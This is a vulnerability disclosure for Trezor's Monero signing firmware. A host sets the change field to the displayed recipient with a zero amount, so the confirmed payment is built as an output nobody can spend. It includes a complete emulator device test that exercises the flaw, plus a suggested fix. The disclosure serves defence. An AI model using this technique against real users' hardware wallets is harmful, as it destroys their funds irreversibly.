# Trezor — Monero confirmation screen does not match the signed one-time destination (`change_dts` alias)

**Firmware:** [`trezor/trezor-firmware@3a9af97`](https://github.com/trezor/trezor-firmware/commit/3a9af97560c2726f48283063e394a15eff36b231)  
**Severity:** Medium  
**Component:** Monero signer on Trezor Core — `MoneroTransactionInitRequest` / `change_dts`  
**Scope:** Confirmation integrity; malicious host  
**Test environment:** Trezor Core T3T1 emulator; `tests/device_tests/monero/test_change_dts_alias.py`; no mocks in the signing path

## Description

Hi. I found this in the Monero signer on Core.

This is not Suite drawing the wrong preview, and it is not a user confirming a bad address that was honestly shown. The device puts Alice and 1 XMR on the screen, the user confirms that, and firmware then builds Alice’s one-time output with the sender’s view key instead of Alice’s. Alice cannot scan it. Alice cannot spend it. The host cannot spend it either. After broadcast the spent XMR is gone.

Someone wants to send 1 XMR. They unlock the Trezor like usual. The PC talks to the device with the normal cold-signing sequence, starting at MoneroTransactionInitRequest (protobuf type 501). That is the production signing path. Official wallet2 / the native Monero tests already send it. No extra opcode, no debug flag. The host just fills the fields.

A Monero send always has at least two outputs (a real dest plus either change or a 0-amount dummy, so sweeps do not stand out on chain). The init message carries both:

- `tsx_data.outputs`: the dests that will actually be written
- `tsx_data.change_dts`: wallet2’s idea of “which one is change”

Firmware has two different definitions of “change”, and they disagree when change_dts.amount is 0.

The screen uses get_change_addr_idx. Amount 0 is falsy, so there is no change row. On a 2-output sweep the 0-amount dummy is hidden. The user sees Alice + 1 XMR + fee.

The one-time dest uses _set_out_derivation. That only checks addr_eq(dst, change_dts.addr). Amount is ignored. If the host sets change_dts.addr = Alice and change_dts.amount = 0, Alice’s output is built as change: P = Hs(a_sender · R || i)·G + B_Alice.

The spendable send to Alice is P' = Hs(r · A_Alice || i)·G + B_Alice. Those are not equal unless Alice’s view key is the sender’s view key.

What the user sees is Alice (4AF64jLQeCqenKbj3KsBDVNVSsTMERfXj9noFwemVGuTTSfF34CH2r1ce3oeaPTb5LX4ALUyMNyszHKrgkDMJYwD24QDTGi) and 1 XMR, plus the fee. Same screens as a regular sweep. They confirm that.

What they just signed is a one-time P Alice will never find. The host gets tx_out and extra (with R) back and can finish the CLSAG and broadcast. The user’s input is spent. Alice never gets 1 XMR. The user never saw a warning that this dest is unspendable.

I did not need the seed, the PIN, physical access, or a swapped device. The only access is being the USB host. The PoC is a malicious MoneroTransactionData.change_dts on purpose.

I want to be precise about impact, because your bounty scores attacker benefit separately from eligibility:

- The user loses the sent amount. That is real.
- The attacker gains 0. There is no second output that pays the host. The dummy is 0. The host has `a` and later `R`, not `b_Alice`, so it cannot form `x = Hs + b_Alice`.
- This is not ransom. Ransom in your text is deny-access-and-sell-restoration. Nobody can restore this P. A “pay me or your XMR is gone” note is a bluff.
- This is not DoS. The device signs. The tx is valid. The dest is just not Alice’s.

So: Medium. Confirmation integrity + irreversible user loss. Not High / theft.

## Why this is in scope

This hits confirmation integrity as you wrote it in the bounty scope:

> Confirmation integrity. What the device shows the user is accurate, and security-critical actions require confirmation on the device that cannot be bypassed. This covers transaction details, the receiving address, and the spending policy established at setup, such as a passphrase or a multisig cosigner set.

You also assume the PC is hostile, same page:

> Malicious host. The host (computer, USB or Bluetooth stack, or connected software) can be fully malicious.

So “the host sent a weird protobuf” is not a reason to drop this. You already do not trust Suite / wallet2. The screen still has to match the one-time dest firmware writes. Here it does not.

Dest keys and amounts are HMAC-bound after init. The host cannot swap Alice for someone else on SetOutput. That binding is not the bug. The bug is that the host still chooses which derivation firmware uses to build Alice’s P, and the screen does not show that choice.

Your protocol-bug rule is a device test, not a writeup:

> For exploits that can be carried out through the device protocol, the report must include a device test demonstrating it. A device test is a Python function under trezor-firmware/tests/device_tests/, run against the emulator through trezorlib, that demonstrates the incorrect behavior by asserting on what the device shows or returns, such as an unexpected acceptance, a missing or wrong confirmation screen, or an incorrect result on valid input.

That is what I attached. The test sends the hostile init on purpose, records the real confirm screens, then reads P out of the real MoneroTransactionSetOutputAck.tx_out and R out of the real MoneroTransactionAllOutSetAck.extra. It checks P against both derivations. It also runs the honest sweep (change_dts = dummy) as a negative control, so the burned P is not “how every sweep looks.” It is fixable in firmware. It passed on this commit.

Same idea on trezor.io/security under devices and firmware (“Bypassing user confirmation”). I am not skipping the button. I am making the button approve the wrong one-time dest.

## How Monero one-time destinations are shaped

A Monero output is not “pay this address.” It is a one-time public key

```text
P = Hs(derivation || i)·G + B
```

and a view tag derived from the same derivation. The recipient scans with their private view key:

```text
derivation_scan = 8 · a_dest · R
```

which equals the sender’s 8 · r · A_dest when the output was built as a send. Then they can compute x = Hs + b and spend.

Firmware picks the derivation in _set_out_derivation:

```text
Change to self: derivation = 8 · a_sender · R (the device knows a)
Send to someone else: derivation = 8 · r · A_dest (the device knows r, not a_dest)
```

Those two are equal only if a_dest == a_sender. For Alice they are not.

Honest wallet2 on a sweep does this:

```text
outputs = [Alice: X, Dummy: 0]
change_dts = {addr: Dummy, amount: 0}
```

Alice is not the change address, so firmware uses r · A_Alice. Alice can scan. That is the negative control in the device test.

The attack is the same shape with one field flipped:

```text
outputs = [Alice: X, Dummy: 0]
change_dts = {addr: Alice, amount: 0}
```

Looks like a sweep. The screen still treats it as a sweep. The signer treats Alice as change.

## What the screen does

Confirm uses get_change_addr_idx, then hides change and hides the 0-amount dummy on a 2-output tx.

core/src/apps/monero/xmr/addresses.py L79–L84

```python
        if (
            change_dts.amount
            and change_dts.amount == dst.amount
            and addr_eq(change_dts.addr, dst.addr)
        ):
            change_idx = idx
```

change_dts.amount == 0 is falsy. change_idx stays None.

core/src/apps/monero/layout.py L125–L138

```python
    for idx, dst in enumerate(outputs):
        is_change = change_idx is not None and idx == change_idx
        if is_change:
            continue  # Change output does not need confirmation
        is_dummy = change_idx is None and dst.amount == 0 and len(outputs) == 2
        if is_dummy:
            continue  # Dummy output does not need confirmation
        ...
        await _require_confirm_output(
            dst, network_type, cur_payment, chunkify=bool(tsx_data.chunkify)
        )
```

Alice is shown with _format_amount / 1 XMR. The dummy is skipped. The sender’s own address is not on the screen. Then the fee screen, hold to confirm. Same as a boring sweep to Alice.

## What the signer does

After confirm, _check_change is supposed to prove change_dts is ours and present in the outputs. On a sweep it gives up:

core/src/apps/monero/signing/step_01_init_transaction.py L277–L279

```python
    if change_index is None and state.output_change.amount == 0 and len(outputs) == 2:
        state.mem_trace("Sweep tsx" if __debug__ else None)
        return
```

change_index is None because amount is 0. Amount is 0. Two outputs. It returns. It never checks that change_dts.addr is the dummy, and it never checks that change_dts.addr is ours. It leaves state.output_change pointing at Alice.

change_address() is only the addr, not the amount:

core/src/apps/monero/signing/state.py L150–L151

```python
    def change_address(self):
        return self.output_change.addr if self.output_change else None
```

When SetOutput builds Alice’s dest, _set_out_derivation sees Alice == change addr and takes the change branch:

core/src/apps/monero/signing/step_06_set_output.py L524–L529

```python
    change_addr = state.change_address()
    if change_addr and addr_eq(dst_entr.addr, change_addr):
        # sending change to yourself; derivation = a*R
        derivation = crypto_helpers.generate_key_derivation(
            state.tx_pub, state.creds.view_key_private
        )
```

That is 8 · a_sender · R. Then

```text
P = Hs(derivation || 0)·G + B_Alice
```

and the HF15 view tag is H("view_tag" || derivation || 0)[0] from the same wrong derivation.

core/src/apps/monero/signing/step_06_set_output.py L214–L223 writes that P and tag into tx_out. step_07_all_outputs_set.py L152–L154 writes R into extra. Later CLSAG does not change either.

MoneroTransactionInitRequest is not a debug backdoor. It is the production signing message, registered in core/src/apps/workflow_handlers.py L176 and dispatched by core/src/apps/monero/sign_tx.py L61–L66.

## How the loss lands on chain

The device test stops at AllOutSet because that is where P and R are fixed. The host can keep going (SignInput / Final), broadcast, and the input is spent.

Concrete numbers from the device test:

- Screen: Alice `4AF64jLQ…24QDTGi`, 1 XMR, fee 0.01 XMR.
- Dummy `42V563ZD…R2ppNuL` is not on the screen.
- The sender's own address is not on the screen.
- Signed `P` (from live `tx_out[2:34]`) equals `Hs(a_sender · R || 0)·G + B_Alice`.
- Signed `P` does not equal `Hs(a_Alice · R || 0)·G + B_Alice`.
- Signed view tag matches the change derivation, not Alice’s scan

After inclusion:

- The user’s input (1.01 XMR in the test) is consumed
- Alice’s wallet view-tag check fails, so she never even tries to spend
- If she did, `a_Alice · R ≠ a_sender · R`, so she cannot form `x`.
- The host cannot form `x` either (no `b_Alice`).
- The dummy pays 0.
- The user lost 1 XMR + fee. The attacker gained 0.

The honest control on the same device, same outputs, only change_dts.addr = Dummy: screen is still Alice / 1 XMR, and live P does equal Alice’s scan. So this is not “sweeps are always unspendable.” It is the alias.

This is firmware-fixable. I demonstrated it the way you asked: a device test under tests/device_tests/ that asserts on what the device shows vs what it returns. That test is below. It passed on this commit against the Core emulator, talking to the real sign_tx path. Nothing in the signing path is mocked.

## Affected devices

Any Core device that can sign Monero (MoneroTransactionInitRequest) is in play: Trezor T, Safe 3, Safe 5, Safe 7, once the owner has unlocked it to approve a send.

The attacker is the host. Malware on the PC, a trojaned wallet, a malicious bridge, a hostile USB stack: that is the environment you already assume, not a user footgun. The owner does the honest thing: reads the screen, sees Alice and 1 XMR, confirms.

What they actually authorize is a transaction the host can finish and broadcast. Loss is the shown send amount, up to the spendable balance of that Monero account, plus the fee. I used 1 XMR so the mismatch is obvious. The host can put any amount the account can pay.

It scales. No extra hardware, no lab, no need to touch the gadget. Every victim with a compromised host and a Monero account on that Trezor is the same USB conversation.

This is confirmation-integrity plus irreversible burn, not a ransom, and not “the user confirmed the attacker address because the screen was honest.” The screen says Alice. The signed dest is not Alice’s. I am not claiming the host steals the coins. Your attacker-benefit ladder puts that at the bottom. That is why I am sending it as Medium, not High.

## Steps to reproduce

1. Check out firmware at 3a9af97560c2726f48283063e394a15eff36b231.
2. Build the Core unix emulator the usual way (xtask build firmware -m t3t1 -e --pyopt=false --debug-link, or the CI image). Monero must be compiled in (not bitcoin-only).
3. From the repo root, with the python env that has this tree’s trezorlib:

```bash
.venv/bin/python core/emu.py --headless --disable-animation --temporary-profile -c \
  .venv/bin/pytest tests/device_tests/monero/test_change_dts_alias.py -v
```

4. You should get three passes:
   - `test_change_dts_alias_burns_shown_dest`: the bug. Live screens contain Alice and 1 XMR and the fee. They do not contain the dummy or the sender address. Live tx_out P equals the change-branch dest Hs(a_sender · R || 0)·G + B_Alice and does not equal Alice’s scan. Live view tag matches the change derivation, not Alice’s.
   - `test_honest_sweep_dummy_change_dts_sends_to_alice`: negative control. Same screens. Live P is Alice’s scan. Honest change_dts = dummy still uses r · A.
   - `test_host_crypto_matches_known_watch_key`: the host-side Monero crypto used to read P / R matches the official MNEMONIC12 watch key.
5. PASS on this firmware means the bug is real. A correct fix should make the burn test fail (reject the aliased change_dts, or build Alice’s P with r · A so it matches the screen).

The client calls are the production Monero signing messages (Init → SetInput → InputVini → AllInputsSet → SetOutput × 2 → AllOutSet). The firmware entry is apps.monero.sign_tx.sign_tx. Screens are whatever require_confirm_output / require_confirm_fee actually drew. P and R are read out of the live acks. The test does not pre-build a burned dest on the host and then “expect” it.

grouping=[1, 1] in the init is only how the PoC asks for two one-output Bulletproof+ proofs. That is a valid host choice (rsig_data.grouping must sum to the output count). It is not the defect. The defect is change_dts vs the screen.

There is also a core unit test that isolates the same split without USB: core/tests/test_apps.monero.change_dts_alias.py. The bounty-required proof is the device test above.

## Proof of concept

Device test, as required: a Python function under tests/device_tests/, emulator + trezorlib, asserts on what the device shows and what it returns.

Raw file tests/device_tests/monero/test_change_dts_alias.py:

```python
# This file is part of the Trezor project.
#
# Medium: confirmation integrity. Malicious host aliases change_dts to the
# shown dest on a 2-output sweep. Screen is Alice + amount + fee (dummy
# hidden). Firmware builds Alice's one-time P with a_sender*R, not r*A.
# Alice cannot scan or spend. Host cannot pocket the output (no b_Alice).
# Not a DoS report: the device signs; the spent XMR is unrecoverable.
#
# Hits production: core/src/apps/monero/signing/step_01_init_transaction.py
# _check_change, step_06_set_output.py _set_out_derivation,
# xmr/addresses.py get_change_addr_idx, layout.py require_confirm_transaction.
#
#   pytest tests/device_tests/monero/test_change_dts_alias.py -v

from __future__ import annotations

import secrets

import pytest
from Crypto.Hash import keccak

from trezorlib import messages, monero
from trezorlib.debuglink import DebugSession as Session
from trezorlib.tools import parse_path

from ...common import MNEMONIC12
from ...input_flows import InputFlowConfirmAllWarnings

pytestmark = [
    pytest.mark.altcoin,
    pytest.mark.monero,
    pytest.mark.models("core"),
    pytest.mark.setup_client(mnemonic=MNEMONIC12),
]

MONERO_PATH = parse_path("m/44h/128h/0h")

# Same 12-decimal format as core/src/apps/monero/layout.py _format_amount
SEND_ATOMIC = 1_000_000_000_000  # 1 XMR
FEE_ATOMIC = 10_000_000_000  # 0.01 XMR
INPUT_ATOMIC = SEND_ATOMIC + FEE_ATOMIC

# Fixed Alice / dummy (distinct view keys). Same vectors as
# core/tests/test_apps.monero.change_dts_alias.py
_ALICE_VIEW = bytes.fromhex(
    "a0eea49140a3b036da30eacf64bd9d56ce3ef68ba82ef13571ec511edbcf8303"
)
_ALICE_SPEND = bytes.fromhex(
    "3482fb9735ef879fcae5ec7721b5d3646e155c4fb58d6cc11c732c9c9b76620a"
)
_DUMMY_VIEW = bytes.fromhex(
    "fd290dce39f781aebbdbd24584ed6d48bd300de19d9c3decfda0a6e2c6751d0f"
)
_DUMMY_SPEND = bytes.fromhex(
    "a0eea49140a3b036da30eacf64bd9d56ce3ef68ba82ef13571ec511edbcf8303"
)


# --- host Monero crypto (LE ed25519 + keccak), only for this test ----------

_P = 2**255 - 19
_L = 2**252 + 27742317777372353535851937790883648493
_D = -121665 * pow(121666, _P - 2, _P) % _P
_I = pow(2, (_P - 1) // 4, _P)
_B58 = b"123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
_ENC_SZ = (0, 2, 3, 5, 6, 7, 9, 10, 11)


def _inv(x: int) -> int:
    return pow(x, _P - 2, _P)


def _xrecover(y: int) -> int:
    xx = (y * y - 1) * _inv(_D * y * y + 1)
    x = pow(xx, (_P + 3) // 8, _P)
    if (x * x - xx) % _P != 0:
        x = x * _I % _P
    if x % 2:
        x = _P - x
    return x


_BY = 4 * _inv(5) % _P
_BX = _xrecover(_BY)
_B = (_BX % _P, _BY % _P)


def _ed_add(p, q):
    x1, y1 = p
    x2, y2 = q
    x3 = (x1 * y2 + x2 * y1) * _inv(1 + _D * x1 * x2 * y1 * y2)
    y3 = (y1 * y2 + x1 * x2) * _inv(1 - _D * x1 * x2 * y1 * y2)
    return (x3 % _P, y3 % _P)


def _ed_mul(s: int, p):
    q = (0, 1)
    while s:
        if s & 1:
            q = _ed_add(q, p)
        p = _ed_add(p, p)
        s >>= 1
    return q


def _encode(p) -> bytes:
    x, y = p
    bits = bytearray(y.to_bytes(32, "little"))
    bits[31] |= (x & 1) << 7
    return bytes(bits)


def _decode(s: bytes):
    y = int.from_bytes(s, "little") & ((1 << 255) - 1)
    x = _xrecover(y)
    if bool(s[31] >> 7) != bool(x & 1):
        x = _P - x
    return (x, y)


def _sc_reduce(b: bytes) -> bytes:
    return (int.from_bytes(b, "little") % _L).to_bytes(32, "little")


def _scalarmult_base(sec: bytes) -> bytes:
    return _encode(_ed_mul(int.from_bytes(sec, "little") % _L, _B))


def _scalarmult(pub: bytes, sec: bytes) -> bytes:
    return _encode(_ed_mul(int.from_bytes(sec, "little") % _L, _decode(pub)))


def _point_add(a: bytes, b: bytes) -> bytes:
    return _encode(_ed_add(_decode(a), _decode(b)))


def _keccak(data: bytes) -> bytes:
    return keccak.new(digest_bits=256, data=data).digest()


def _varint(n: int) -> bytes:
    out = bytearray()
    while n >= 128:
        out.append((n & 127) | 128)
        n >>= 7
    out.append(n)
    return bytes(out)


def generate_key_derivation(pub: bytes, sec: bytes) -> bytes:
    # 8 * sec * pub  (Monero generate_key_derivation)
    eight_sec = (8 * (int.from_bytes(sec, "little") % _L)) % _L
    return _scalarmult(pub, eight_sec.to_bytes(32, "little"))


def derive_public_key(derivation: bytes, index: int, dest_spend: bytes) -> bytes:
    hs = _sc_reduce(_keccak(derivation + _varint(index)))
    return _point_add(_scalarmult_base(hs), dest_spend)


def _b58_encode_block(data: bytes) -> bytes:
    size = _ENC_SZ[len(data)]
    n = int.from_bytes(data, "big")
    out = bytearray(size)
    for i in range(size - 1, -1, -1):
        n, r = divmod(n, 58)
        out[i] = _B58[r]
    return bytes(out)


def xmr_addr_encode(prefix: int, spend: bytes, view: bytes) -> bytes:
    body = bytes([prefix]) + spend + view
    body += _keccak(body)[:4]
    out = bytearray()
    i = 0
    while i + 8 <= len(body):
        out += _b58_encode_block(body[i : i + 8])
        i += 8
    if i < len(body):
        out += _b58_encode_block(body[i:])
    return bytes(out)


def _b58_decode_block(enc: bytes, raw_len: int) -> bytes:
    n = 0
    for c in enc:
        n = n * 58 + _B58.index(c)
    return n.to_bytes(raw_len, "big")


def xmr_addr_decode(addr: bytes) -> tuple[bytes, bytes]:
    # 95-char standard address → 8*8 + 5 payload bytes
    raw = bytearray()
    i = 0
    while i + 11 <= len(addr):
        raw += _b58_decode_block(addr[i : i + 11], 8)
        i += 11
    if i < len(addr):
        rem = len(addr) - i
        raw_len = _ENC_SZ.index(rem)
        raw += _b58_decode_block(addr[i:], raw_len)
    body, chk = bytes(raw[:-4]), bytes(raw[-4:])
    assert _keccak(body)[:4] == chk
    return body[1:33], body[33:65]


def format_xmr(atomic: int) -> str:
    d = 10**12
    s = f"{atomic // d:,}".lstrip(",") + f".{atomic % d:012d}"
    s = s.rstrip("0").rstrip(".")
    return s + " XMR"


def view_tag(derivation: bytes, index: int) -> int:
    # Same as step_06 _derive_view_tags: H("view_tag" || deriv || uvarint(i))[0]
    return _keccak(b"view_tag" + derivation + _varint(index))[0]


def on_screen(screens: str, needle: str) -> bool:
    return needle in screens or "".join(needle.split()) in "".join(screens.split())


def _addr_msg(spend: bytes, view: bytes) -> messages.MoneroAccountPublicAddress:
    return messages.MoneroAccountPublicAddress(
        spend_public_key=spend, view_public_key=view
    )


def _dest(
    amount: int, spend: bytes, view: bytes
) -> messages.MoneroTransactionDestinationEntry:
    return messages.MoneroTransactionDestinationEntry(
        amount=amount, addr=_addr_msg(spend, view), is_subaddress=False
    )


def _wallet_from_secs(view_sec: bytes, spend_sec: bytes):
    return _scalarmult_base(view_sec), _scalarmult_base(spend_sec)


def _make_incoming_output(view_sec: bytes, spend_pub: bytes, index: int = 0):
    """Build a spendable incoming P = Hs(r*A || i)*G + B for this wallet."""
    r = _sc_reduce(secrets.token_bytes(32))
    tx_pub = _scalarmult_base(r)
    view_pub = _scalarmult_base(view_sec)
    der = generate_key_derivation(view_pub, r)
    p = derive_public_key(der, index, spend_pub)
    return tx_pub, p


def _drive_sweep(
    session: Session,
    *,
    change_spend: bytes,
    change_view: bytes,
    alice_spend: bytes,
    alice_view: bytes,
    dummy_spend: bytes,
    dummy_view: bytes,
    sender_view_sec: bytes,
    sender_spend_pub: bytes,
) -> tuple[str, bytes, bytes, bytes]:
    """Run Init→SetInput→Vini→AllIn→SetOutput×2→AllOutSet.

    Returns (screens, alice_P, tx_pub_R, alice_tx_out). AllOutSet is the
    last step that binds P and R; later CLSAG does not change the dest.
    """
    alice = _dest(SEND_ATOMIC, alice_spend, alice_view)
    dummy = _dest(0, dummy_spend, dummy_view)
    change_dts = _dest(0, change_spend, change_view)

    tx_pub_in, p_in = _make_incoming_output(sender_view_sec, sender_spend_pub)
    src = messages.MoneroTransactionSourceEntry(
        outputs=[
            messages.MoneroOutputEntry(
                idx=0,
                key=messages.MoneroRctKeyPublic(
                    dest=p_in, commitment=_scalarmult_base(bytes(32))
                ),
            )
        ],
        real_output=0,
        real_out_tx_key=tx_pub_in,
        real_output_in_tx_index=0,
        amount=INPUT_ATOMIC,
        rct=True,
        subaddr_minor=0,
    )
    tsx = messages.MoneroTransactionData(
        outputs=[alice, dummy],
        change_dts=change_dts,
        num_inputs=1,
        mixin=0,
        fee=FEE_ATOMIC,
        account=0,
        minor_indices=[0],
        rsig_data=messages.MoneroTransactionRsigData(
            rsig_type=3, bp_version=4, grouping=[1, 1]
        ),
        # Must be present on the wire. Device asserts unlock_time is not None
        # after confirm (step_01:103). 0 is the honest-wallet value.
        unlock_time=0,
        client_version=3,
        hard_fork=15,
    )

    pages: list[str] = []

    def on_page(layout) -> None:
        pages.append(layout.visible_screen())

    with session.test_ctx as client:
        client.set_input_flow(
            InputFlowConfirmAllWarnings(session, on_page=on_page).get()
        )
        init = session.call(
            messages.MoneroTransactionInitRequest(
                address_n=MONERO_PATH, tsx_data=tsx
            ),
            expect=messages.MoneroTransactionInitAck,
        )
        inp = session.call(
            messages.MoneroTransactionSetInputRequest(src_entr=src),
            expect=messages.MoneroTransactionSetInputAck,
        )
        session.call(
            messages.MoneroTransactionInputViniRequest(
                src_entr=src,
                vini=inp.vini,
                vini_hmac=inp.vini_hmac,
                orig_idx=0,
            ),
            expect=messages.MoneroTransactionInputViniAck,
        )
        session.call(
            messages.MoneroTransactionAllInputsSetRequest(),
            expect=messages.MoneroTransactionAllInputsSetAck,
        )
        out0 = session.call(
            messages.MoneroTransactionSetOutputRequest(
                dst_entr=alice, dst_entr_hmac=init.hmacs[0]
            ),
            expect=messages.MoneroTransactionSetOutputAck,
        )
        session.call(
            messages.MoneroTransactionSetOutputRequest(
                dst_entr=dummy, dst_entr_hmac=init.hmacs[1]
            ),
            expect=messages.MoneroTransactionSetOutputAck,
        )
        done = session.call(
            messages.MoneroTransactionAllOutSetRequest(),
            expect=messages.MoneroTransactionAllOutSetAck,
        )

    tx_out = bytes(out0.tx_out)
    assert tx_out[0] == 0
    # HF15 tagged key: variant 3, P at [2:34], view tag at [34]
    assert tx_out[1] == 3
    alice_p = tx_out[2:34]
    extra = bytes(done.extra)
    assert extra[0] == 1
    tx_pub_r = extra[1:33]
    return "\n".join(pages), alice_p, tx_pub_r, tx_out


def test_host_crypto_matches_known_watch_key():
    """Sanity: decode the MNEMONIC12 primary address and match watch-key*G."""
    addr = (
        b"4Ahp23WfMrMFK3wYL2hLWQFGt87ZTeRkufS6JoQZu6MEFDokAQeGWmu9MA3GFq1y"
        b"VLSJQbKJqVAn9F9DLYGpRzRAEXqAXKM"
    )
    spend, view = xmr_addr_decode(addr)
    watch = bytes.fromhex(
        "8722520a581e2a50cc1adab4a1692401effd37b0d63b9d9b60fd7f34ea2b950e"
    )
    assert _scalarmult_base(watch) == view
    assert xmr_addr_encode(18, spend, view) == addr


def test_change_dts_alias_burns_shown_dest(session: Session):
    """Medium: confirmation integrity. Malicious host, firmware-fixable.

    Attack (looks like a wallet2 2-output sweep):
      outputs     = [Alice: 1 XMR, Dummy: 0]
      change_dts  = {addr: Alice, amount: 0}   # honest wallet2 puts Dummy here

    What the attacker can do to the user (not DoS, not theft):
      1. Screen is Alice + 1 XMR + fee. Dummy is hidden (sweep UI).
         User confirms a payment to Alice.
      2. Firmware builds Alice's one-time P on the change branch
         (a_sender·R), not the send branch (r·A).
      3. After the host broadcasts, Alice cannot scan: view tag and
         P are both wrong for a_Alice·R. The 1 XMR never arrives.
      4. The spent output is unrecoverable. Nobody has b_Alice, so
         nobody can form x = Hs(a_sender·R||0) + b_Alice.
      5. Host has a and later R. That is not enough to spend or
         restore. Not theft. Not ransom.

    Severity is Medium (shown ≠ signed, user loses X) not High
    (attacker benefit is 0: bottom of the bounty ladder).
    """
    watch = monero.get_watch_key(session, MONERO_PATH)
    sender_view_sec = bytes(watch.watch_key)
    sender_spend, sender_view = xmr_addr_decode(bytes(watch.address))
    assert _scalarmult_base(sender_view_sec) == sender_view

    alice_view_pub, alice_spend_pub = _wallet_from_secs(_ALICE_VIEW, _ALICE_SPEND)
    dummy_view_pub, dummy_spend_pub = _wallet_from_secs(_DUMMY_VIEW, _DUMMY_SPEND)
    alice_addr = xmr_addr_encode(18, alice_spend_pub, alice_view_pub)
    dummy_addr = xmr_addr_encode(18, dummy_spend_pub, dummy_view_pub)
    sender_addr = xmr_addr_encode(18, sender_spend, sender_view)

    screens, p, r, tx_out = _drive_sweep(
        session,
        change_spend=alice_spend_pub,
        change_view=alice_view_pub,
        alice_spend=alice_spend_pub,
        alice_view=alice_view_pub,
        dummy_spend=dummy_spend_pub,
        dummy_view=dummy_view_pub,
        sender_view_sec=sender_view_sec,
        sender_spend_pub=sender_spend,
    )

    # 1. Confirm-integrity lie (what the user saw).
    assert on_screen(screens, alice_addr.decode())
    assert on_screen(screens, format_xmr(SEND_ATOMIC))
    assert on_screen(screens, format_xmr(FEE_ATOMIC))
    assert not on_screen(screens, dummy_addr.decode())
    # Not presented as a change-to-self. Sender's own address is absent.
    assert not on_screen(screens, sender_addr.decode())

    der_alice = generate_key_derivation(r, _ALICE_VIEW)
    der_change = generate_key_derivation(r, sender_view_sec)
    p_alice = derive_public_key(der_alice, 0, alice_spend_pub)
    p_change = derive_public_key(der_change, 0, alice_spend_pub)

    # 2. Signed P is the change-branch dest, not Alice's spendable dest.
    assert p == p_change
    assert p != p_alice

    # 3. Alice's scanner never considers this output (view tag mismatch).
    tag = tx_out[34]
    assert tag == view_tag(der_change, 0)
    assert tag != view_tag(der_alice, 0)

    # 4–5. Host cannot pocket or restore: needs b_Alice, does not have it.
    # (No second output pays the host; dummy amount is 0.)
    assert p_change != p_alice


def test_honest_sweep_dummy_change_dts_sends_to_alice(session: Session):
    """Negative: honest wallet2 (change_dts = dummy) still uses r*A for Alice."""
    watch = monero.get_watch_key(session, MONERO_PATH)
    sender_view_sec = bytes(watch.watch_key)
    sender_spend, sender_view = xmr_addr_decode(bytes(watch.address))

    alice_view_pub, alice_spend_pub = _wallet_from_secs(_ALICE_VIEW, _ALICE_SPEND)
    dummy_view_pub, dummy_spend_pub = _wallet_from_secs(_DUMMY_VIEW, _DUMMY_SPEND)
    alice_addr = xmr_addr_encode(18, alice_spend_pub, alice_view_pub)

    screens, p, r, tx_out = _drive_sweep(
        session,
        change_spend=dummy_spend_pub,
        change_view=dummy_view_pub,
        alice_spend=alice_spend_pub,
        alice_view=alice_view_pub,
        dummy_spend=dummy_spend_pub,
        dummy_view=dummy_view_pub,
        sender_view_sec=sender_view_sec,
        sender_spend_pub=sender_spend,
    )

    assert on_screen(screens, alice_addr.decode())
    assert on_screen(screens, format_xmr(SEND_ATOMIC))
    der_alice = generate_key_derivation(r, _ALICE_VIEW)
    p_alice = derive_public_key(der_alice, 0, alice_spend_pub)
    assert p == p_alice
    assert tx_out[34] == view_tag(der_alice, 0)
```

## Measured result

What I measured on this commit, Core T3T1 emulator, that file, no mocks:

```text
test_change_dts_alias_burns_shown_dest PASSED
test_honest_sweep_dummy_change_dts_sends_to_alice PASSED
test_host_crypto_matches_known_watch_key PASSED
3 passed in 14.85s
```

## Suggested fix

I did not patch firmware. One rule would close it: the derivation branch and the screen must use the same change index.

- _set_out_derivation should call get_change_addr_idx (or consume the index _check_change already computed) and use a · R only for that output. addr_eq(dst, change_dts.addr) with amount ignored is the hole.
- The sweep shortcut in _check_change should not leave output_change pointing at a dest the UI just treated as the payment. Either clear output_change on that path, or require change_dts.addr to be the 0-amount dummy, not Alice.
- Do not treat change_dts.amount == 0 as “this addr is change” anywhere. Amount 0 is how wallet2 marks the dummy.
- After the fix, the burn test should fail (reject, or P == Alice’s scan). The honest dummy-change_dts test should still pass.
